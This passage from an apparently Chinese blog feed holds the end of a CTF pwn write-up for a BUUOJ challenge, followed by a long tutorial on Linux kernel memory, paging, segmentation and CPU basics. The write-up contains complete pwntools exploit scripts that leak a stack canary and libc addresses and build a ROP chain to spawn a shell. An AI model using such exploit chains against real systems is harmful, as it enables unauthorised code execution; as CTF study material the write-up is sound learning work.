class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_64&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">29125</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line">main_addr = <span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x400690</span></span><br><span class="line">rdi_addr = <span class="number">0x400a93</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leave_addr = <span class="number">0x400824</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x87</span>)+<span class="string">b&quot;1&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0xa</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x98</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recv(<span class="number">0x98</span>)</span><br><span class="line">start_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = start_addr - <span class="number">240</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0xf1147</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x88</span>+p64(canary)+p64(<span class="number">0xabcdabcd</span>)+p64(onegadget_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>不过这题不知道为啥 read函数虽然对输入的数据进行了限制 但是好像还是可以超额输入 原理暂时还不清楚 留个坑</p><p>所以这题可以用构造rop链 泄露libc基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27865)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露canary</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x400a93</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=<span class="number">0x400690</span></span><br><span class="line">main_addr=<span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><p>payload总长明显是超过0x100的 但是gdb动调看了一下 确实是能写进去的</p><p><a href="https://pic.imgdb.cn/item/639c6e8eb1fccdcd36b17088.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/639c6e8eb1fccdcd36b17088.png"></a></p><p>你直接打断点是看不到这些栈的内容的 这一段在高地址处 因为是之前执行过的栈</p><p>所以你需要用 set $rsp &#x3D; $rsp - 0x68来调整一下rsp寄存器的位置 因为stack是以sp寄存器为0来延申的</p><p>这里还有一点是要注意的 此时我们一直是在while循环中 在执行完一连串的指令后 并不会跳转到返回地址 因为这并不属于一个栈帧的结束 从栈上的地址逐渐降低也可以看出来 所以我们需要手动退出while循环</p><p>剩下的就没什么好说的了 完整exp：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#p=remote(&#x27;node4.buuoj.cn&#x27;,27865)</span><br><span class="line">p=process(&#x27;./pwn&#x27;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">#泄露canary</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)</span><br><span class="line">payload=&#x27;a&#x27;*(0x80+8)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)</span><br><span class="line">p.recvuntil(&#x27;a\n&#x27;)</span><br><span class="line">canary=u64(p.recv(7).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">pop_rdi=0x400a93</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt=0x400690</span><br><span class="line">main_addr=0x400908</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)</span><br><span class="line">payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;1&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;&gt;&gt;&quot;,&#x27;3&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">puts_addr=u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x80+8)+p64(canary)+p64(0)</span><br><span class="line">payload+=p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计组原理</title>
      <link href="/2022/12/14/%E8%AE%A1%E7%BB%84%E5%8E%9F%E7%90%86/"/>
      <url>/2022/12/14/%E8%AE%A1%E7%BB%84%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>已经学习了pwn一段时间 自从开始接触堆以后 就越发感觉计组原理的重要性 终有一日也是要自己读源码 自己挖洞的 所以从现在开始扎实基础知识</p><p>并且同时在刷c语言题的时候 遇到了Segmentation Fault的报错 打算弄懂 没想到这一下子就是扯出一整块知识</p><p>本篇的篇幅将会十分长 将从0开始写起 梳理和补缺知识点 并且由于是构建一个逻辑性的知识梳理 所以不会像wiki一样详细 可能大部分是一个体系的指导或者记录一些难懂的知识点</p><p>并且这种基础知识 不同于呆板的文科学习 如果只是背诵八股文 那么依然达不到用处</p><p>希望读者阅读完整篇后 能够形成自己的理解 </p><p>并且 本文一部分是参照着&lt;&lt;小林图解计算机&gt;&gt;来写的 建议还是去看他的 能够梳理更清楚的框架</p><h2 id="Linux内核1"><a href="#Linux内核1" class="headerlink" title="Linux内核1"></a>Linux内核1</h2><p>你可以把linux内核理解为一个中介 其负责硬件和软件的通信</p><p>对应用程序来说 他有什么请求的时候就会将其通过内核传递给硬件 而内核又充当一个底层驱动程序 对设备和组件进行寻址 并且内核是应用程序逻辑上的最底层</p><p>同时 内核也相当于一个库 系统调用即是通过这个库实现 应用程序进行系统调用就像调用普通函数一样</p><p><a href="https://pic.imgdb.cn/item/63bd8cfbbe43e0d30e64fcdb.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bd8cfbbe43e0d30e64fcdb.png"></a></p><p>如图所示 为GNU&#x2F;linux的基本体系结构 蓝色部分是用户空间 下方是内核空间</p><p>内核空间的最上方是系统调用接口 下面依次是通用的内核代码和特殊的内核代码(略)</p><p>内核也可以拆分成两部分 <strong>微内核</strong>和<strong>宏内核</strong></p><p>微内核又可以称为中央内核 内核的一些基本操作是基于其实现的 其他的功能是交给一些独立进程 这些进程通过特定的通信接口和内核通信</p><p>宏内核 你可以将其理解为一个整体 一个文件 其包含了内核的所有代码和<strong>五个子系统</strong> 在宏内核中 任意一个函数都可以访问到内核的任意地方 </p><p>五个子系统分别是 <strong>进程调度</strong> <strong>内存管理</strong> <strong>虚拟文件系统</strong> <strong>网络接口</strong>和<strong>进程间通信</strong></p><p>其中比较重要的是进程调度和内存管理两个系统 这里拿出来说说 其他的可自行了解</p><p>进程调度：linux系统是一个动态的系统 怎么理解这句话 其通过不断变化的各种进程来适应不断变化的计算需求</p><p>也就是说 linux中的所有操作 你都可以将其视为一个进程</p><p>比如说 我接下来编译如下的二进制文件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">close(<span class="number">1</span>);</span><br><span class="line">close(<span class="number">2</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按理来说应该会直接进行了系统调用 随后我们直接cat flag就能获取flag了是吧 但是运行之后发现</p><p><a href="https://pic.imgdb.cn/item/63bd8d18be43e0d30e65706e.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bd8d18be43e0d30e65706e.png"></a></p><p>没有回显 这是因为关闭了文件描述符1和2 其对应着标准输出和标准错误 文件描述符相当于一个索引值 其代表的是一个进程 也就是说 在当前终端 输出(即与屏幕的通信接口)被关闭了 这个进程被中断了 那么这里可以用重定向(不解释)</p><p>回归正文 linux中的所有进程都源于一个父进程 即fork函数 先调用了这个函数 然后才有了其他的子进程</p><p>并且 每一个子进程都有其自己的PID(可以理解为名字) 比如我们可以用 ps -e来查看当前所有的进程</p><p><a href="https://pic.imgdb.cn/item/63bd8d2ebe43e0d30e65baf6.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bd8d2ebe43e0d30e65baf6.png"></a></p><p>(进程数量过多 这里仅仅这是截取了开头的小部分)</p><p>不过这里的PID在进程结束以后 是可以被其他的进程获取的 即其是重复使用的</p><p>可见进程对于linux系统的重要性 所以 内核中的其他四个子系统都是依赖于进程调度的 通过其来挂起或者恢复进程</p><p>当一个进程需要用到其不能得到的资源时 他会调起其他的进程 而自己会进入睡眠状态 分为两种:可被打断的睡眠和不可被打断 区别在于字面意思 收到信号以后 前者就会恢复进程</p><p>当然了 进程的信息肯定不单单只有PID 其还包括进程的优先级、地址的空间等信息 这些内容都会存储在其(单个进程)的一个独立的数据结构中 这个结构称为进程控制块 进程管理也就是管理这些块</p><p>内存管理: 提起内存 那么牵扯到的东西就多了 小到cpu的缓存 大到虚拟内存 需要极大的篇幅来叙述 所以我们接下来将偏移正文很长时间 来从0朔源起内存这一个概念</p><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>最早的图灵机也有内存的概念 如果其要计算1+1 那么就会将1 + 1这三个放上带子 随后由读写头读入到控制器中</p><p><a href="https://pic.imgdb.cn/item/63bd8d6fbe43e0d30e669840.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bd8d6fbe43e0d30e669840.png"></a></p><p>这一点和现如今使用的I&#x2F;O总线类似 其分为地址总线 数据总线 控制总线</p><p>数据总线将读写到的数据传输给控制总线(I&#x2F;O总线不在这里展开)</p><p>这一做法主要是因为数据的读取速度远远慢于计算速度 并且这样可以减少读取数据的次数</p><p>做个直观的比喻 你掉落了100根牙签在地上，没有缓冲区的情况是</p><p>你弯腰捡完一根牙签就起身把他放回桌子上，接下来继续重复流程</p><p>而有了缓冲区以后，你弯腰捡完牙签，你会先把他放在手上，等手中的牙签数量足够多的时候，你才会起身放回桌面</p><p>cpu中的缓存概念也类似于上述</p><p>cpu拥有<strong>三级缓存 简称为 L1 L2 L3</strong></p><p>每级缓存逐渐递增缓存量 而读取速度逐渐减少</p><p>L1和L2是每一个cpu核心所特有的 而L3通常是几个核心共用</p><p>这三级缓存采用的<strong>SRAM(静态存储器)</strong> 其特点是价格高昂 并且断电后数据就会消失 但是因为其优秀的读取速度 被广泛运用在cpu缓存中</p><p>这里额外提一嘴扩展 我们经常会听到cpu超频 这个说法还得从cpu如何执行指令说起</p><p>在很多非科班的编程语言培训和你第一节计算机导论课上都会提到 低级语言和高级语言 你只知道一个概念 就是计算机读不懂你写的程序 比如c语言</p><p>他需要经过编译 将其转化成计算器能读懂的机器码</p><p>这其中的过程可不是能简单用编译两个字来概括的</p><p>就比如用gcc来编译一个c语言程序举例 </p><p>我们编写了一个输出hello world的程序 接着编译这个程序 他会经历四个阶段 : <strong>预处理阶段 编译阶段 汇编阶段 链接阶段</strong></p><p>预处理阶段: 这个阶段主要是将我们程序调用的头文件插入到程序文本中 接着由a.c得到a.i 文件扩展名发生了变化</p><p>编译阶段: 生成了一个汇编语言程序 文件扩展名变成了s 并且每条汇编语句还对应着一条低级机器语言</p><p>汇编阶段: 将文件翻译成机器语言 打包在一个可重定位的二进制文件中 后缀名变为o （这里的可重定位你可以理解为是为了接下来的链接）</p><p>链接阶段: 将文件进行静态链接或者动态链接 区别在于是否通过libc库调用函数(如果pwn学到了ret2libc 应该对这块的过程很了解 这里不过多赘述)</p><p>接着 这些机器指令被传给了计算机 他需要经历三个阶段 才能从接收到实现 ： <strong>Fetch（取指）Decode（译码）Execute（执行指令）</strong></p><p>具体的功能不过多赘述 不过从字面意思应该也能理解各步骤的作用</p><p>cpu实现这些步骤也是需要时间的 所花费的时间以时间周期为基本单位来衡量 而cpu的主频就是cpu运算速度的单位，cpu的运算速度单位有MHz、GHz，其中GHz&#x3D;1024MHz</p><p>但是并不意味着主频越大 cpu的性能越好 这还要参考指令集 发热 等等因素</p><p>接着我们说回到内存 基础的我就懒得写了 毕竟好理解 网上资料也多 实在不行我的个人博客里也有提到内存地址之类的概念</p><p>为什么会有虚拟内存这个概念？当我们电脑的物理内存不够时 虚拟内存机制可以支持计算机在硬盘中划出一块空间来充当内存使用</p><p>并且多个程序可以共有同一块内存区 大大提高了计算机的运算性能和效率</p><p>虚拟内存的实现有三种方式 <strong>分页 分段 段页式</strong></p><p><strong>分页:</strong></p><p>以下所叙述的 前提是没有开启虚拟存储机制(不赘述 自行了解)</p><p>接下来我们清楚两个主角 物理内存和虚拟内存</p><p>所谓的分页是将这二者划分成大小相同的”块” 前者称为页框 后者为页面</p><p>而虚拟内存是远远大于物理内存的 所以其分配到的”块”是不能都有对应的物理内存的</p><p>为什么这么说？ 我们先得了解cpu的寻址是如何计算的 用32位cpu举例来说 </p><p>这里引入一个概念 <strong>I&#x2F;O总线</strong></p><h3 id="I-O总线"><a href="#I-O总线" class="headerlink" title="I&#x2F;O总线"></a>I&#x2F;O总线</h3><p>三种总线: <strong>地址总线 数据总线 控制总线</strong></p><p>这里只介绍第一种 地址总线</p><p>最底层的数据是通过高低电压来传输的</p><p> 比如说想要传输5这个值 那么就需要三个电压 101 如果只有一条地址总线 那么需要传输三次 </p><p>这样一位一位传输的方式，称为串行，下一个 bit 必须等待上一个 bit 传输完成才能进行传输</p><p>要想提高效率 就需要增加地址总线 </p><p>但是也不能无脑增加 32位的cpu自身的位宽只有32 要想让他跨级传输64位甚至更多的地址位宽</p><p>这明显是不现实的 所以最好的情况下是cpu的位宽刚好和地址位宽一致 所以32位cpu能够寻址到的内存大小是4gb</p><p>ps: 这一块不懂的可以看一下下面这段 截取自《小林图解计算机》</p><ul><li>如果地址总线只有 1 条，那每次只能表示 「0 或 1」这两种地址，所以 CPU 能操作的内存地址最大数量为 2（2^1）个（注意，不要理解成同时能操作 2 个内存地址）；</li><li>如果地址总线有 2 条，那么能表示 00、01、10、11 这四种地址，所以 CPU 能操作的内存地址最大数量为 4（2^2）个。</li></ul><p>说回到虚拟内存为什么比物理内存大得多</p><p>32位的情况下 物理内存最大支持4GB 但是虚拟内存是每个进程所独立拥有的 这样才能确保虚拟内存地址不冲突 而进程是不会只有一个的</p><p>所以这种情况下 势必会出现虚拟内存的页面对应不上物理内存的页框</p><p>这种问题称为<strong>缺页中断</strong> 出现这种情况时 系统会从物理内存中挑选一个使用最少的页框 将其内容存放回硬盘 这样就腾出了一个新的页面 接着重新映射到这个空闲的页</p><p>我们所提到的这些操作 是由MMU（内存管理单元）来实现的 包括映射和虚拟内存的分配</p><p>了解一下就好 扩展的话自己百度百度吧</p><p>接下里的内容就需要带脑子看了 虽然说一直都需要脑子 我们来介绍一下 虚拟内存的页面是如何索引到物理内存的</p><p>每一个虚拟地址都由两部分组成 页号和页内偏移 页号是页表的索引 页表中存储的是物理内存每页框的基地址 这个类似于libc基址 页内偏移加上页表中的基地址 就索引到了物理地址</p><p>然后页表实际上是存储在MMU中 这里的索引其实有点类似于ret2dl的知识点 虽然说这个github上有很多开源的工具可以做到脚本攻击 但是建议还是自己去阅读理解</p><p>但是这样的索引机制其实存在一个缺陷 假设32位的情况下 虚拟内存有4GB 假设一个页为4kb 那么就分成了一百万个页 就对应着一百万个页表 页表存储的是物理内存地址的基址 32位情况下需要4字节 这就需要4MB</p><p>你会觉得这样也很小 占用不到哪里去 但是你要知道计算机在运行时一般不会只有一个进程 如果你上面按照我说的查看了你虚拟机里的所有进程 你就会知道这个4MB会被乘以多少</p><p>为了解决这个问题 还有一种多项页表</p><p>还是按照上文的数据假设 对于一个进程来说 一共有4mb的一百万个页表项 如果这些页表继续进行页号的索引 即形成二级页表 </p><p>二级页表仍然由页表项索引指向一级页表 分配方案为 1024个二级页表 每个页表中仍然有1024个页表项 这样可以索引到1,048,576个一级页表</p><p>但是你想 一级页表占用4kb 其进行了二级页表分页后 二级页表的大小是4MB 那这样不多了内存吗？</p><p>但是 你要知道不是每个进程都会占用4GB的虚拟内存 往往会剩余很多 我们一级页表是为了覆盖整个物理内存 才需要不管其有没有占用满 都需要一一对应上</p><p>但是二级页表不用这种担心 所以其实大部分情况下 二级页表是分配不到那么多的 所以实际上 增加二级页表机制以后</p><p>一个进程所需要的页表项空间为： 4KB+(二级页表占用率)x4MB 得到的值是小于原本的4MB的 这样子就成功节约了空间</p><p>下面为补充知识 个人认为可掌握可不掌握</p><p><a href="https://pic.imgdb.cn/item/63bd8d96be43e0d30e67160b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bd8d96be43e0d30e67160b.png"></a></p><p>上图是页表项的详细结构 其中 页框号就是页号 用来索引物理内存地址 相当重要</p><p>“在&#x2F;不在”位的值是一个布尔类型 1时代表此页表项所指引的页框不在虚拟内存上 如果调用到了这个页表项 就会触发缺页中断</p><p>保护位字面意思 用来防止非法调用 上图是比较低级的页表项 好的页表项还会有三位 代表可读 可写 可执行</p><p>修改位 如果这个页表项所指引页面被修改了 那么其对应在硬盘上的值也必须被修改 如果没有 那么这个页面就可以直接被丢弃 差不多你可以理解为 你在玩游戏 你使用了一个道具 那么虚拟内存调用到这个的时候 就会把你硬盘中道具的</p><p><strong>分段:</strong></p><p>这一部分还是很简单的 至少对于分页来说</p><p>将虚拟内存分为了多个段落 并且每个段落的长度并不是相等的 这部分和glibc内存管理是一样的 这里就不重复说了 讲一点不一样的</p><p>和分页机制类似 分段机制下的虚拟内存地址也包括两个部分 段选择子和段内偏移量</p><p>段选择子是段表的索引 而段表中存储的值是这个段映射的物理内存地址的基地址</p><p>加上段内偏移量后 就是物理内存地址</p><p>但是不同于分页的是 段存在着很大的缺陷 就是内存碎片的问题</p><p>因为段所对应的物理内存并不会是连续的一块空间 这么说不好理解 举个例子</p><p>一共有1024mb的内存空间 浏览器占了512mb 视频播放器128mb 图片管理器占了256mb</p><p>这时候如果把视频播放器的进程终止了 按理来说应该还有128mb(原本空余剩下的)+128mb(视频播放器腾出来的)</p><p>但是我们仍然打不开一个256mb的进程</p><p>因为这里的256mb的内存并不是连续的 中间是断开的</p><p>这就出现了外部内存碎片</p><p>那么相对的 还有内部内存碎片 比如我们打开一个视频播放器 但是我们实际上使用的内存只有几十mb 但是这个进程占用的高达256mb </p><p>这就出现了内存的浪费</p><p>并且分段机制下的内存交换的效率还很低</p><p>什么是内存交换 当我们出现了外部内存碎片的情况下 解决办法就是将图片管理器的内存接到浏览器的后面</p><p>先把这一块内存写到硬盘上 再读取回来 就接在了浏览器的后面</p><p>但是由于这样的内存交换需要将整个进程和硬盘交互 但是我们前面已经讲过了 硬盘的读写速度是远远比不上内存的 所以会被效率造成严重的拖累</p><p><strong>段页式:</strong></p><p>字面意思 结合了分段和分页两种机制的一种虚拟内存分配方式</p><p>其将虚拟内存按照逻辑 分段后 再段中分页 然后和物理内存对应 这样的优点就是又有分段试的管理又有分页式的调用</p><p>缺点就是在调用的过程中要不断的查表 既有段表又有页表 增加了硬件成本</p><p>接下来详细介绍一下段页式内存映射的原理</p><p>虚拟内存这回由三部分构成 段号 段内页号 页内偏移</p><p>有了前面的基础 这回就很好理解了</p><p>内存先访问段表 然后访问页表 接着加上页内偏移 就得到了物理内存地址</p><p>到这里我们就已经普及完了内存的一些知识点 理解完这些你应该对内存差不多有了大概的概念 接着我们说回到linux内核的子系统之一内存管理</p><h2 id="Linux内核2"><a href="#Linux内核2" class="headerlink" title="Linux内核2"></a>Linux内核2</h2><p>32位计算机的情况下 linux的虚拟内存分为两个部分 一是3GB大小的用户空间 二是1GB大小的内核空间</p><p>内核空间是所有进程所共享的</p><p>Linux内核所需求的内存一般都是以字节为单位 所以对于使用分页机制来说 若直接分配一页内存 会造成内存浪费</p><p>于是有一个叫slab分配器的东西 来专门负责小内存分配</p><p>不过其依然是通过申请大内存 然后对自己申请来的内存进行细分管理</p><p>除了分配小内存外 其还有第二个作用 就是提供一个类似于堆块缓存区的东西</p><p>(给不是pwn手的简单介绍一下堆块缓存区bins 就是比如说申请了一个范围大小的chunk 将其释放以后 其不会回到原本的内存里面 会被放到大小对应的垃圾桶(bins) 如果下次调用小于或者等于(并不是都适用的 要分辨是哪种bins) 就会从bins中分配)</p><p>这样子的好处就是当内核频繁调用小内存时 可以快速分配对象 提高效率</p><p>不过总得用slab分配器的术语来描述一下:</p><p>slab维护着对象的缓存 内核中有些结构 初始化所花费的时间高于为其分配空间的时间 所以就会新增一个slab使用构造函数为其初始化</p><p>即使这个结构被释放了  他也会保持初始化状态 下次生成就不用初始化</p><p>如果你会一点汇编 你会发现 经常性的会出现地址跳转的指令 比如此时正在执行0x1000地址处的指令 现在要跳转到0x1100</p><p>你以为只是很简单的跳转？ 其实不然 原理涉及到了slab的着色机制</p><p>我们前面已经说了 cpu有自己的三级缓存 在执行指令时 一级缓存是交互最快的地方 而缓存中调用地址是采取缓存行的形式</p><p>比如说此时缓存行一行是64字节 那么:</p><p><a href="https://pic.imgdb.cn/item/63bd8daabe43e0d30e67563a.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63bd8daabe43e0d30e67563a.png"></a></p><p>再假设此时读取的物理内存基址是0x1000 那么第0缓存行读取的地址范围就是0x1000~0x1040</p><p>但是这时候要调用0x1100地址处的指令呢 是不是就得将0x1000-0x1040物理内存地址的数据写回硬盘 然后载入0x1100-0x1140</p><p>但是这样子如果频繁调用的话 效率太低 造成大量的时间消耗 于是采取了slab着色 为0x1100带上偏移 这样子计算的时候就可以代入到第1缓存行 这样子就不用频繁交换</p><p>所以着色其实就是加上偏移 只不过不同对象的偏移不一样 颜色也不一样</p><p>ps:slab内容远远不及于此 但是我感觉深究下去也不是个头 并且现阶段没有必要了解那么深 所以点到为此</p><h2 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h2><p>首先需要知道cpu是怎么执行程序的</p><p>CPU又称中央处理器 字面意思是计算机的核心 和人脑一样的地位 其内部包括许多零件 诸如寄存器 控制单元 逻辑运算单元等</p><p>其中寄存器负责管理运算数据的存储 以及指令地址和指令内容 分别由三种寄存器种类存储:</p><p>通用寄存器 程序计数器 指令寄存器</p><p>并且cpu拥有自己的缓存区 称为cache 分别有L1 L2 L3 </p><p>其中L1缓存区分为指令缓存和数据缓存 二者大小一致</p><p>cpu对于cache的读写速度远远大于内存 而上述三个cache 随着数字的增大 缓存空间逐渐增加 读写速度逐渐降低</p><p>cpu可以拥有多个核心 而每个核心都有自己特有的L1 L2 cache，L3 cache是所有核心所共享的</p><p>cpu和计算机的交互是通过IO总线来实现的 IO总线分为 地址总线 控制总线 数据总线</p><p>当cpu读写数据的时候 先通过地址总线来确定目标的地址 再通过控制总线决定是写入还是写出 最后由数据总线传输数据</p><p>cpu是如何执行程序的呢?</p><p>如果你学过学校教的计算机组成原理 你应该知道冯诺依曼模型 cpu执行程序相当于一行一行执行代码 而执行代码又是将一行代码拆分成指令和数据</p><p>其中数据的总类也很多样 全局变量和局部变量 二者还可以延申出不同的数据类型 int double等</p><p>例如puts函数输出的字符串也是数据 其会保存在rodata段</p><p>指令实际上是一串二进制的机器码 每条指令都有各自的机器码 cpu通过解析机器码来了解指令需求</p><p>指令的机器码解析由cpu的指令集负责 而不同的cpu的指令集不同 也就对应不同的汇编语言和机器码</p><p>下面举例MIPS指令集来解析一下指令的机器码的构造</p><p><a href="https://pic.imgdb.cn/item/63c57bbcbe43e0d30e944d29.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63c57bbcbe43e0d30e944d29.png"></a></p><p>MIPS指令集一共有三种格式 每种格式的长度都为32位</p><p>前六位是操作码 用来表示该指令作用 后26位根据不同格式构造不同</p><p>R格式用于逻辑和算术运算</p><p><a href="https://pic.imgdb.cn/item/63c57cb4be43e0d30e95c5da.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63c57cb4be43e0d30e95c5da.png"></a></p><p>划分出来的六个区块大小分别为6 5 5 5 5 6位 如果操作码不够描述指令 函数码也可以用来描述</p><p>I格式用于数据传输和条件分支</p><p><a href="https://pic.imgdb.cn/item/63c57d6cbe43e0d30e96dc34.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63c57d6cbe43e0d30e96dc34.png"></a></p><p>J格式用于跳转地址 构成是三者中最简单的 除了操作码其余都是跳转的地址</p><p><a 